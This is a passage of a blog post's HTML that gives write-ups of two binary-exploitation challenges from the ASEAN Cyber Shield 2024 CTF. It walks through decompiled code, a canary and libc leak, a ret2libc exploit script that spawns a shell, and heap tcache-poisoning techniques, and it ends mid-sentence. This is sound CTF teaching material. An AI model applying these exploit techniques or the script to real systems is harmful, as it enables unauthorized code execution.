@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ASEAN Cyber Shield 2024 | zhiren</title>
+<meta name="keywords" content="">
+<meta name="description" content="writeups for acs pwn challs">
+<meta name="author" content="">
+<link rel="canonical" href="https://zh1ren.github.io/posts/acs24/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bff9ea534f65d95fa54e4acbb4245968e8f466efcde15f973a90ca891dd8766e.css" integrity="sha256-v/nqU09l2V&#43;lTkrLtCRZaOj0Zu/N4V&#43;XOpDKiR3Ydm4=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://zh1ren.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zh1ren.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zh1ren.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zh1ren.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zh1ren.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-XHJYTREZSC"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-XHJYTREZSC', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="ASEAN Cyber Shield 2024" />
+<meta property="og:description" content="writeups for acs pwn challs" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zh1ren.github.io/posts/acs24/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-12-17T09:38:09+08:00" />
+<meta property="article:modified_time" content="2024-12-17T09:38:09+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ASEAN Cyber Shield 2024"/>
+<meta name="twitter:description" content="writeups for acs pwn challs"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zh1ren.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ASEAN Cyber Shield 2024",
+      "item": "https://zh1ren.github.io/posts/acs24/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ASEAN Cyber Shield 2024",
+  "name": "ASEAN Cyber Shield 2024",
+  "description": "writeups for acs pwn challs",
+  "keywords": [
+    
+  ],
+  "articleBody": " Overview My team Copi Kincau (comprised of Firdaus, Teng, Raihan, and me) was one of 4 teams that represented Malaysia in this year’s ASEAN Cyber Shield. We travelled to Ha Long Bay, Vietnam during November to play in the ctf, and managed to get 3rd in the student category!\nThe ctf was organised by KISA, and had teams from all the ASEAN countries. It had some difficult and high quality pwn challs, and I’ll be sharing the writeups of two of them in this post.\n(was busy, so post is almost a month late)\nAll attachments can be found here.\nSpecial thanks to RE:HACK and NACSA for selecting us to represent Malaysia and the support given by them throughout the contest.\na drop of tear (pwn) I was really happy that I solved this one since only 2 teams out of all 37 teams in the preliminary solved it!\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c // from ghidra decompilation void init(void){ local_14 = open(\"/home/acs_ctf/flag\",0); read(local_14,\u0026local_18,4); srand(local_18); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stdout,(char *)0x0,2,0); signal(0xe,exit); signal(0xb,correct_indicate); alarm(0x78); return; } undefined8 main(void){ ... local_10 = *(long *)(in_FS_OFFSET + 0x28); init(); local_134 = 0; local_128[0] = 0xdeadbeef; local_128[1] = 0xcafebabe; local_128[2] = 0x1337c0d3; local_128[3] = 0x79427942; ... do { puts(\"a drop of tear makes me relieved.\"); local_134 = get_signedint(\u0026local_134); if (local_134 == 0x10001) { guessed_num(); } else { if ((int)local_134 \u003c 0x10002) { if (local_134 == 0x67) { puts(\"one drop of tear will be dropped.\"); exit(0); } if ((int)local_134 \u003c 0x68) { if (local_134 == 0x65) { puts(\"test your luck.\"); __isoc99_scanf(\"%c\",\u0026local_130); getchar(); if (0x44 \u003c local_130) { puts(\"wrong choice\"); exit(-1); } local_130 = local_128[(int)((local_130 \u0026 0xff) - 0x41)]; //\u003c-- NEGATIVE INDEX VULN puts(\"what if choice is.....?\"); __isoc99_scanf(\"%c\",\u0026local_135); getchar(); if (local_135 == '/') { puts(\"divided by...?\"); __isoc99_scanf(\"%d\",\u0026local_12c); getchar(); local_130 = (int)local_130 / local_12c; } else { if (local_135 \u003c '0') { if (local_135 == '-') { puts(\"minus...?\"); __isoc99_scanf(\"%d\",\u0026local_12c); getchar(); local_130 = local_130 - local_12c; } else { if (local_135 \u003c '.') { if (local_135 == '*') { puts(\"multiply...?\"); __isoc99_scanf(\"%d\",\u0026local_12c); getchar(); local_130 = local_12c * local_130; } else { if (local_135 == '+') { puts(\"plus...?\"); __isoc99_scanf(\"%d\",\u0026local_12c); getchar(); local_130 = local_12c + local_130; } } } } } } uVar1 = rand(); if (uVar1 == local_130) { puts(\"Correct! wow..\"); guessed_num(); } else { puts(\"..?\"); } goto LAB_00101a39; } if (local_134 == 0x66) { puts(\"test your exploit skill.\"); read(0,\u0026local_118,0x140); // \u003c----- BUFFER OVERFLOW HERE if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return 0; } __stack_chk_fail(); } } } printf(\"%d is wrong choice.\\n\",(ulong)local_134); } LAB_00101a39: puts(\"\"); } while( true ); } void get_signedint(char *param_1){ read(0,param_1,4); atoi(param_1); return; } void guessed_num(void){ long in_FS_OFFSET; uint local_20; uint local_1c; int local_18; int local_14; long local_10; local_18 = open(\"/home/acs_ctf/flag\",0); read(local_18,\u0026local_20,4); close(local_18); __isoc99_scanf(\"%d\",\u0026local_1c); if (local_20 != local_1c) { puts(\"Wrong!\"); exit(-1); } puts(\"Correct\"); local_14 = open(\"/home/acs_ctf/flag\",0); read(local_14,\u0026local_1c,4); local_1c = local_1c \u0026 0xffffff; printf(\"Of course, you are playing %s CTF, right?\\n\",\u0026local_1c); close(local_14); return; } Reversing The binary loads the first 4 bytes of /home/acs_ctf/flag as the rand() seed.\nIt then goes into an infinite loop requesting user input to select options:\n101: guess the random number 102: buffer overflow then return from main 103: exit() 65537: guessed_num() How option 101 works is one byte of user input is requested, and that byte is used to index array local_128 through local_128[one_byte_input-0x41)];.\nlocal_128 is also populated at the start of the process:\nlocal_128[0] = 0xdeadbeef; local_128[1] = 0xcafebabe; local_128[2] = 0x1337c0d3; local_128[3] = 0x79427942; So if you enter ‘A’, index 0 is used, and your current guess is 0xdeadbeef.\nYou can then perform basic arithmetic operations +-*/ on your guess, and that final guess will be used to be compared with the random number generated by rand().\nSo if you had 0xdeadbeef as your guess, you could +1 to it, and make it 0xdeadbef0.\nIf your guess was correct, guessed_num() would be called.\nWhat guessed_num() does is just ask for the first 4 bytes of /home/acs_ctf/flag, and outputs those bytes out again if you get it right.\nYou can directly call the guessed_num() function by using option 65537, but idt its possible to use that option since the program just reads 4 byte from the user for choosing options.\nOption 102 is just a classic bof, but there’s a canary and PIE stopping you, so there’s not much you can do with just that.\nVulnerabilities The flag format of the ctf is ACS{...}, so the seed of rand() was just ACS{.\nThus you can always predict what the correct answer is.\nThere is also a negative index vuln in the number guessing option:\nlocal_128[one_byte_input-0x41)]; where you can enter bytes smaller than 0x41 to access values before the array.\nThis is how the array looks in memory:\n0x7fffffffe0f8: 0x8e9331be0e56d100 \u003c- canary ... 0x7fffffffe138: 0x00007ffff7e3dee3 \u003c_IO_file_overflow+259\u003e \u003c- libc address ... 0x7fffffffe1c8: 0x00000001deadbef0 \u003c- your guess (0xdeadbef0) 0x7fffffffe1d0: 0xcafebabedeadbeef \u003c- local_128 0x7fffffffe1d8: 0x794279421337c0d3 ... This means that you can use negative indexes to access your previous guess, the canary, and libc address, and use them as your current guess.\nKeep in mind tho that you don’t get to directly input the indexes, and have to input a byte that is first subtracted with 0x41, then only be used to index local_128. So if I input byte \\x0b, the array will be indexed through local_128[0xb-0x41], and the first 4 bytes of the canary will be used as our current guess.\nAnd memory will look like this:\n... 0x7fffffffe1c8: 0x000000010e56d100 \u003c- your current guess before any +-*/ is performed 0x7fffffffe1d0: 0xcafebabedeadbeef \u003c- local_128 0x7fffffffe1d8: 0x794279421337c0d3 ... Ok nice, so we can use either the canary or libc addresses as our guess, what can we do with that?\nWe can actually use this to leak canary and libc, and once we have those values, we can just ret2libc using option 102.\nBut how do we actually leak values using number guessing?\nLeaking Since we know the random seed, we always know what the correct guess is.\nIf we take the canary as our random guess, and shift it 31 bits to the left, leaving the LSB of the canary as the MSB of our guess. Then setup the rest of the 31 bits to be same as the correct guess. We will know that the LSB of the canary, is same as the MSB of the correct guess, if our guess was correct and guessed_num() is called. If our guess was incorrect, then we know that the LSB bit of the canary is the opposite of the MSB bit of the correct guess.\nExample:\n(everything is represented in bits, and scaled down to 8 bits for simplicity of example) ITERATION 1: rand num: ... canary: 10101010 guess: 10101010 \u003c- access canary using negative index multiply 2**7 to shift guess 7 bits to the left guess: 00000000 ITERATION 2: rand num: 11110000 guess: 00000000 \u003c- access back previous guess add 7 bits of the correct guess guess: 01110000 OUTCOME OF ITERATION 2: wrong guess Thus we know that largest bit of our guess is wrong, and is NOT 1. So the smallest bit of the canary, is 0. When we want to brute the next bit, we just shift one less bit to the left, so shift 6 bits, and do the same thing. We just have to do some slight calculations to correctly setup the other 7 bits of the correct guess.\nExample:\nlet's say you found out the last bit of the canary to be 1, when you shift the canary 6 bits to the left, you know that: guess: ?1000000 during the next iteration of the infinite loop, say rand num: 00001111 guess: ?1000000 to setup the rest of the 7 bits of your guess, you have to subtract 15 from guess guess: ?0001111 Through this, we can brute the canary and libc bit by bit, and we can then just ret2libc!\nYou just need time to brute, and my exploit took a little under 2 mins to run on the remote server.\nexploit.py:\nfrom pwn import * from ctypes import CDLL #io = process(\"./tear\",aslr=True) io = remote(\"10.100.0.43\",10002) libc = ELF(\"./libc.so.6\") cdll_libc = CDLL('libc.so.6') cdll_libc.srand(0x7b534341) def brute_bit(s): # to use this func, bit alr has to be setup # only DONT change MSB state = s cur_rand = cdll_libc.rand() target = cur_rand \u0026 0x7fffffff state = (state\u00260x7fffff00) + ord('?') diff = abs(target-state) if (target \u003e state): io.sendlineafter(b\"relieved.\",b\"101\") io.sendlineafter(b\"luck\",b\"?\") # to choose back guess io.sendlineafter(b\"choice\",b\"+\") io.sendlineafter(b\"plus...?\",str(diff).encode()) else: io.sendlineafter(b\"relieved.\",b\"101\") io.sendlineafter(b\"luck\",b\"?\") io.sendlineafter(b\"choice\",b\"-\") io.sendlineafter(b\"minus...?\",str(diff).encode()) resp = io.recvuntil(b\"..\") if b\"wow\" in resp: # bit matches the rand io.sendline(b\"2069054273\") # have to do this for some reason io.sendlineafter(b\"relieved.\",b\"101\") io.sendlineafter(b\"luck\",b\"A\") io.sendlineafter(b\"choice\",b\"-\") cdll_libc.rand() return cur_rand \u003e\u003e 31 else: # bit does not match the rand return not (cur_rand \u003e\u003e 31) # realised when writing the writeup that this should be name dword, not qword def brute_qword(idx,start_bit,end_bit,known=0): # brute start bit - end bit, inclusive qword = known for i in range(start_bit,end_bit+1): # load the ptr we want to leak # multiply 2**n shift n bytes to left io.sendlineafter(b\"relieved.\",b\"101\") io.sendlineafter(b\"luck\",idx.to_bytes(1,\"little\")) io.sendlineafter(b\"choice\",b\"*\") io.sendlineafter(b\"multiply...?\",str(2**(31-i)).encode()) cdll_libc.rand() new_bit = brute_bit(qword \u003c\u003c (31-i)) qword = (new_bit\u003c\u003ci) + qword log.info(\"QWORD BRUTED\") return qword canary = (brute_qword(0xc,0,31)\u003c\u003c32) + (brute_qword(0xb,8,31)) log.info(\"CANARY: \" + hex(canary)) libc.address = (brute_qword(0x1c,0,15)\u003c\u003c32) + brute_qword(0x1b,8,31,known=0xe3) - libc.symbols[\"_IO_file_overflow\"] - 259 log.info(\"LIBC BASE: \" + hex(libc.address)) pop_rdi = p64(libc.address + 0x10f75b) ret = p64(libc.address + 0x10f75c) ret2libc = b\"A\"*0x108 + p64(canary) + p64(0) + ret ret2libc += pop_rdi + p64(next(libc.search(b\"/bin/sh\"))) + p64(libc.symbols[\"system\"]) io.sendlineafter(b\"relieved.\",b\"102\") io.sendlineafter(b\"skill.\",ret2libc) io.sendline(b\"cat /home/acs_ctf/flag\") io.interactive() vote your favourite ctf! (pwn) I was really really really close to solving this in the finals, but I ran out of time. Would’ve been really satisfying to solve it but even if I did, we’d still be 3rd. Also iirc only 2/10 teams solved it.\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled LIBC: GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. src.c\nReversing It’s a C++ binary, where you can insert ctf names and vote ctfs.\nadd your favorite ctfs! 1. add ctf 2. vote ctf 3. remove ctf 4. exit input: Each ctf is stored as an object in the heap.\nThe addresses of these objects are stored in a global array which I named ctfs_arr.\nEach ctf object is 0x958 bytes, and has properties:\n- name - topics - photo width - photo height - photo - photo magic value Which are all set when you add a ctf.\nThe name is just a 31 byte C string and is always asked for, but the topics and photo is compulsory.\nIf you do choose to write topics, the amount of topics is requested (must be \u003c 6).\nTopic names are then read in as C++ basic_strings, and stored in a C++ vector.\n(I actually didn’t know that they’re stored in vectors until after the ctf, more on this later)\nIf you choose to give a photo, the width and height of the photo is requested, both of which are shorts and must be \u003c 0x30. Then, width*height bytes is read in as the photo, through:\nread(0,pvVar3,(long)((int)height * (int)width)); A magic value based on the photo is also generated, and stored at object+0x938.\nvoid set_magic(long obj){ long lVar1; lVar1 = generate_magic(obj); /* if magic is not 0x1337133713371337, then set the magic */ if (lVar1 != 0x1337133713371337) { *(long *)(obj + 0x938) = lVar1; } return; } // just go through every byte of photo and magic = byte + magic*0x17 long generate_magic(long obj){ short j; long local_10; local_10 = 0x1337133713371337; j = 0; while (((((int)j \u003c (int)*(short *)(obj + 0x16) * (int)*(short *)(obj + 0x14) \u0026\u0026 (-1 \u003c *(short *)(obj + 0x14))) \u0026\u0026 (-1 \u003c *(short *)(obj + 0x16))) \u0026\u0026 (j \u003c 0x900))) { local_10 = (long)*(char *)(obj + 0x38 + (long)(int)j) + local_10 * 0x17; j = j + 1; } return local_10; } Once you finish making a ctf, the photo is rendered and printed onto the screen.\nThe photo is just a bunch of *s and .s, having char ‘1’ being a *, and the rest being ..\nThe raw bytes of the photo is also printed through printf(\"... %s\\n\",...);\nThe ctf objects looks something like this in memory:\n0x55555556feb0: 0x000055555555bc80 \u003c- pie readonly address storing funcptr 0x55555556feb8: 0x00000000 \u003c- votes 0x55555556febc: 0x00000001 \u003c- has_photo boolean 0x55555556fec0: 0x00000000 0x55555556fec4: 0x0010 \u003c- photo width 0x55555556fec6: 0x0020 \u003c- photo height 0x55555556fec8: 0x00000072656d6167 \u003c- name ... 0x55555556fee8: 0x3231333231333231 \u003c- photo bytes ... 0x5555555707e8: 0x6b55ee1041d66d0f \u003c- magic 0x5555555707f0: 0x0000555555570840 \u003c-| 0x5555555707f8: 0x0000555555570880 |- topics vector stuff 0x555555570800: 0x0000555555570880 \u003c-| ------------------------------------------------------------------------------------------ more on the pie readonly address: 0x000055555556feb0: 0x000055555555bc80 → 0x0000555555558522 → endbr64 #The vector object is also allocated in the heap as a chunk more on the vector object: 0x555555570840: 0x0000555555570850 0x0000000000000004 0x555555570850: 0x0000000041414141 0x0000000000000000 0x555555570860: 0x0000555555570870 0x0000000000000004 0x555555570870: 0x0000000042424242 0x0000000000000000 0x555555570880: 0x0000000000000000 Im pretty sure the vector ptrs in the ctf object are just the vector startptr and endptr: 0x5555555707f0: 0x0000555555570840 0x5555555707f8: 0x0000555555570880 0x555555570800: 0x0000555555570880 (this ptr is diff when there's 3 elements tho) Inside the vector, the string / char ptr is stored, followed by the length of the str, then the actual bytes of the string: 0x555555570840: 0x0000555555570850 0x0000000000000004 0x555555570850: 0x0000000041414141 0x0000000000000000 When you choose option 2 (vote a ctf), all ctf’s name, photo render, and topic names will be printed.\nThe magic number of all the ctfs with photos will be checked as well, and the process will exit if any magic numbers are wrong.\nulong check_magic(long param_1){ ulong uVar1; ulong uVar2; uVar1 = *(ulong *)(param_1 + 0x938); uVar2 = generate_magic(param_1); return (uVar1 == uVar2); } Once you vote a ctf, their total votes will +1.\nWhen you choose option 3, and choose a ctf to remove by giving its index, the magic check will be done on the ctf as well. Once it passes the check, the address at **ctf_object will be called, with ctf_object being its argument. So:\nctf_object = 0x000055555556feb0; 0x000055555556feb0: 0x000055555555bc80 → 0x0000555555558522 → endbr64 $rip: 0x0000555555558522 $rdi: 0x000055555556feb0 I didn’t really reverse the function at 0x0000555555558522, but after its called, the vector object and the ctf object is freed. Afterwards the ctf object ptr is nullified in the ctf_arr list (so no UAF).\nWhen you choose option 4, the ctf with the most votes is declared the winner, and main() returns afterwards.\nVulnerabilities When making a new ctf, you can enter negative width and height:\nprintf(\"width? \"); __isoc99_scanf(\"%hd\",\u0026width); printf(\"height? \"); __isoc99_scanf(\"%hd\",\u0026height); getchar(); // the comparisons here are done with instrs jg and jle, which are signed comparisons // thus negative values of width and height will be false for these comparisons if ((0x2f \u003c width) || (0x2f \u003c height)) { exit(-1); } set_obj_width(*(undefined8 *)(\u0026ctfs_arr + (long)idx * 8),(int)width); set_obj_height(*(undefined8 *)(\u0026ctfs_arr + (long)idx * 8),(int)height); With that, you can read as many bytes as you want in:\nread(0,pvVar3,(long)((int)height * (int)width)); Since you can enter any negative height and width, and negative multiplied with negative is positive, you can read any amount of bytes into the photo property of the ctf objects.\nHowever, the binary tries to prevent this by using the magic value.\nlong generate_magic(long obj){ short j; long local_10; local_10 = 0x1337133713371337; j = 0; while (((((int)j \u003c (int)*(short *)(obj + 0x16) * (int)*(short *)(obj + 0x14) \u0026\u0026 (-1 \u003c *(obj + 0x14))) \u0026\u0026 (-1 \u003c *(obj + 0x16))) \u0026\u0026 // \u003c- negative values fails this (j \u003c 0x900))) { local_10 = (long)*(char *)(obj + 0x38 + (long)(int)j) + local_10 * 0x17; j = j + 1; } return local_10; } // the test and js instructions are used to check if *(obj+0x14) and *(obj+0x16) are negative // test sets the sign flag if they're negative, and js jumps if sign flag is set Because of the negative width and height, we won’t execute the code in the while loop at all, and generate_magic() will return 0x1337133713371337.\nThus set_magic() won’t set the magic property of the ctf object:\nvoid set_magic(long obj){ long lVar1; lVar1 = generate_magic(obj); // if lVar1 == 0x1337133713371337, do nothing if (lVar1 != 0x1337133713371337) { *(long *)(obj + 0x938) = lVar1; } return; } The magic property of the ctf object will be null.\nThis becomes a problem when you try to vote or delete the ctf object, as it will fail the magic check:\nulong check_magic(long param_1){ ulong uVar1; ulong uVar2; uVar1 = *(ulong *)(param_1 + 0x938); uVar2 = generate_magic(param_1); // uVar1 will be 0, uVar2 will be 0x1337133713371337 // so this will return false, and process will terminate return (uVar1 == uVar2); } However, the magic property is stored below the photo property of the object, which you have unlimited write to. So you can just overflow the photo property, and write 0x1337133713371337 as the magic yourself!\nWith that, you have unlimited overflow in the heap, giving you the ability to overwrite the topics vector of the object, and also any heap chunk that is below the object. But before we can pop a shell, we will need some memory leaks.\nLeaking Since this is how the binary prints out the raw bytes of the photo after you make a ctf:\nuVar4 = get_photo(*(\u0026ctfs_arr + idx*8)); // address of obj's photo will be returned printf(\"photo format : %s\\n\",uVar4); And the photo is followed by the magic, which is then followed by a heap address (topics vector):\n0x55555556fee8: 0x3231333231333231 \u003c- photo bytes ... 0x5555555707e8: 0x1337133713371337 \u003c- magic 0x5555555707f0: 0x0000555555570840 \u003c- heap addr The heap addr is leaked when you completely fill up the photo buf,and setup the magic properly:\nAAAAAAAAAAA...\\x37\\x13\\x37\\x13\\x37\\x13\\x37\\x13heap_leak\\x00 Since there’s no null bytes to terminate the string before the heap address.\nAs for leaking libc, and other values, I used the topics of the object.\nI actually didn’t know that the topic names are stored in a vector during the finals, since I didn’t really reverse the functions that are used to handle topics. I took more of a dynamic analysis approach to seeing how the topics are stored, by playing with them and viewing them in memory.\nWhat I saw was that when you have one topic:\n... rest of ctf obj ... 0x5555555707f0: 0x0000555555570810 \u003c- startptr 0x5555555707f8: 0x0000555555570830 \u003c- endptr 0x555555570800: 0x0000555555570830 \u003c- endptr 0x555555570808: 0x0000000000000031 \u003c- new heap chunk 0x555555570810: 0x0000555555570820 \u003c- char ptr 0x555555570818: 0x0000000000000004 \u003c- number of bytes 0x555555570820: 0x0000000041414141 \u003c- actual bytes 0x555555570828: 0x0000000000000000 A 0x30 heap chunk would be allocated, having a char ptr in it that points to chunk+0x10.\nAnd the ctf object will have pointers pointing to the start and end of this chunk.\nSince we can overflow the ctf object, we could overwrite the start and end ptrs to point to memory we control (can freely write), and craft our fake chunk there. By setting up a pointer in that fake chunk, we can get arbitary read when we print the topic names.\nTo do all this, we have to know at what address the memory we control is, and also the address which its contents we want to leak. Thanks to the heap leak before, we know the addresses of our ctf objects (and its properties), and also we can leak any value that is stored inside the heap.\nIn smaller binaries like this, as long as you have a heap leak, you can calculate the heap base, and from then on you’ll know where everything in the heap is. Since there’s very little mallocs and frees called, and the places where they are called are the same everytime the binary is ran, the heap layout is very predictable.\nSo an example of leaking through topics:\n... 0x55555556ff10: addr \u003c- whatever addr that we want to leak its contents, so leak *addr 0x55555556ff18: 0x8 ... 0x5555555707f0: 0x55555556ff10 \u003c- overwrote to point to some photo bytes of own obj 0x5555555707f8: 0x55555556ff30 \u003c- overwrote endptr to startptr+0x20 0x555555570800: 0x55555556ff30 With this, we can leak any *addr, as long as we know addr!\nCurrently, with PIE and everything, we only know heap addresses.\nHow can we leak libc? Is there any libc addresses inside the heap?\nWe can just free a large enough chunk, so that it goes into the unsorted bin. That way the chunk will have a double linked list that contains a libc pointer.\nto learn more about binning.\nThe ctf object is perfect for this, since its 0x958 bytes, large enough to just go straight into the unsorted bin when freed. Remember tho to put a chunk between the unsorted bin chunk and the wilderness to prevent consolidation.\nWith that, we have heap and libc leak, as well as arbitary read into any heap and libc addr.\nif pwndbg heap commands doesn’t work, you just have to use heap set-arena to tell it where main_arena is. You can find out where the main_arena is by using the address in unsorted bin chunks, as it is main_arena+0x60.\nExploitation I first tried overwriting the address which stored a function ptr (placed at the start of the ctf object), to an address I control, which has a one_gadget in it. But the one_gadgets didn’t work.\nThen, I went for a tcache poisoning attack, which is essentially just overwriting the fd ptr of chunks in tcache bin:\n# pointer mangling not shown for simplicty before corruption: Tcachebin[idx=2,size=0x30]: 0x555555570910 -\u003e 0x555555570940 0x555555570900: 0x0000000000000000 0x0000000000000031 0x555555570910: 0x555555570940 (fd) 0x0000000000000000 0x555555570920: ... 0x555555570930: 0x0000000000000000 0x0000000000000031 0x555555570940: ... ... so when a 0x30 chunk is requested, 0x555555570910 will be allocated first. then when another 0x30 chunk is requested, 0x555555570940 will be allocated next, as it follows the fd ptr of the 0x555555570910 chunk after corruption: Tcachebin[idx=2,size=0x30]: 0x555555570910 -\u003e addr 0x555555570900: 0x0000000000000000 0x0000000000000031 0x555555570910: addr (fd) 0x0000000000000000 0x555555570920: ... when a 0x30 chunk is requested, 0x555555570910 is allocated first. But for the next allocation, addr will be allocated, as its the fd of 0x555555570910 chunk It’s important to note however that we’re using glibc 2.35, and pointer mangling is done on the fd pointers:\n// from https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L340 #define PROTECT_PTR(pos, ptr) \\ ((__typeof (ptr)) ((((size_t) pos) \u003e\u003e 12) ^ ((size_t) ptr))) So in reality, the tcache chunks look something like this:\nTcachebin[idx=2,size=0x30]: 0x555555570910 -\u003e 0x555555570940 0x555555570900: 0x0000000000000000 0x0000000000000031 0x555555570910: 0x555000025c30 (fd) 0x0000000000000000 0x555555570920: ... 0x555555570930: 0x0000000000000000 0x0000000000000031 0x555555570940: ... ... mangling: (0x555555570910\u003e\u003e12)^0x555555570940 = 0x555000025c30 So whenever we want to overwrite the fd pointer, we have to remember to mangle our address:\ndef mangle(dest,pos): return (pos \u003e\u003e 12) ^ dest When you allocate a 0x20 byte topic, the bytes aren’t just stored in the vector object like when you allocate less bytes, but instead another chunk is allocated specifically for the topic name:\nwhen you allocate a 0x4 byte topic: 0x555555570830: ... 0x0000000000000031 0x555555570840: 0x0000555555570850 0x0000000000000004 0x555555570850: 0x0000000041414141 0x0000000000000000 when you allocate a 0x20 byte topic: heap chunk: 0x555555572ec0: ... 0x0000000000000031 0x555555572ed0: 0x0000555555572f00 ... 0x555555572ee0: ... heap chunk: 0x555555572ef0: 0x0000000000000000 0x0000000000000031 0x555555572f00: 0x4141414141414141 0x4141414141414141 0x555555572f10: 0x4141414141414141 0x4141414141414141 So using this, you can get two 0x30 chunks side by side, and will free both of them when you delete the ctf object, giving you the ability to setup the heap so that:\n------------------- | free ctf obj | \u003c- (next ctf object allocation) ------------------- | free 0x30 chunk | \u003c- tcache will allocate this first if 0x30 chunk is requested ------------------- | free 0x30 chunk | \u003c- then this ------------------- Before I tried to get this setup, I made sure there were nothing in the free lists to make things easier. Also like I said before, I didn’t fully reverse the topics functions, so sometimes there’s unexpected chunks that are suddenly allocated/freed, so I just had to play around with it a bit to get this configuration.\nWith that, when we allocate the next ctf object, we can overflow the free 0x30 chunk, and overwrite its fd pointers with what we want. Remember to not give any topics since that’ll mess up the setup.\nallocate ctf obj and overflow fd: -------------------------------- | ctf_obj | -------------------------------- | free 0x30 chunk, fd=own_addr | \u003c- tcache will give this first when 0x30 chunk is requested -------------------------------- | free 0x30 chunk | -------------------------------- tcache will give own_addr next when another 0x30 chunk is requested So when we make another ctf object, this time with a 0x20 byte topic, a 0x30 chunk will be requested to setup the vector object, and the chunk which has its fd overwritten will be returned. When another 0x30 chunk is requested to store our 0x20 byte topic name, the addr which we overwrote fd with will be returned, and we will achieve arbitary overwrite.\nThe only criteria for the addr to overwrite fd with is that it is 0x10 bytes aligned, otherwise heap security checks will be triggered. (I’m pretty sure tcache is meant for fast allocation, so there’s pretty few security checks. For example tcache doesn’t check if the heap metadata header of the to-be-allocated chunk is set properly.)\nOnly question is now is, what do we overwrite?\nI chose to just leak the stack by leaking the environ variable in libc using the method shown above, and overwrite the ret pointer of add_ctf():\n0x00007fffffffe2a0│+0x0000: 0x00007fffffffe2c0 \u003c---- overwrite from here 0x00007fffffffe2a8│+0x0008: 0x00005555555572b6 ← $rsp 0x00007fffffffe2b0│+0x0010: 0x0000000100000000 0x00007fffffffe2b8│+0x0018: 0x5098e54495573500 0x00007fffffffe2c0│+0x0020: 0x0000000000000001 ← $rbp environ is a variable in libc that stores where the start of the environment variables are in the stack. I’m pretty sure the difference in environment variables is what makes stack offsets different in remote and local. So the ret ptrs (which are above environ) are all at the same offsets relative to environ across remote and local, since all the noise of the stack happens after environ.\nand well this is where I got stuck in the finals The overwrite worked perfectly when I tried overwriting with 0x20 As, but failed when I tried to ret2libc, and overwrite with:\np64(0) + pop_rdi + p64(next(libc.search(b\"/bin/sh\"))) + p64(libc.symbols[\"system\"]) I thought it failed because the topic name was read in through C++ \u003e\u003e, and it couldn’t read null bytes. Or maybe a strlen was used in determining the malloc size, and having a null byte in it made it so that not a 0x30 byte chunk was used. So another chunk is allocated elsewhere, not at the place we want.\nI actually tried to overwrite exit_handlers, and leak the pointer_guard using the topics method before I tried doing ret2libc, but that faced the same overwrite problem as well.\nIn the end, I ran out of time, and didn’t solve this challenge.\nAfter the ctf, I tried the challenge again, and played around with this more.\nI tried overwriting with 0x20 null bytes to see if the overwrite will work, and to my surprise, it did!\nI investigated more, and turns out, the overwrite failed because my pop rdi gadget was at the address 0x1555550bd3e5, and the overwrite failed everytime it encountered a \\x0b byte. The gadget was always at that address too since I turned ASLR off using pwntools when testing.\nWhen I tried it with 0x15555541d3e5, the overwrite worked. So there’s no problems writing pointers, except for some with bad bytes like \\x0b.\nIn hindsight, I probably should have tested the C++ \u003e\u003e thing by using the binary normally and making some topics with null bytes, before going ahead with my assumptions. But well, there was very little time left when I faced this problem, and was just throwing stuff to see what works.\nAlso, it could have been because I wasn’t using the libc given , but was using my local libc (which is also glibc 2.35, just not the same one).\nI first tried to do a ret2libc, but was faced with the movaps issue. I couldn’t write an extra ret gadget to deal 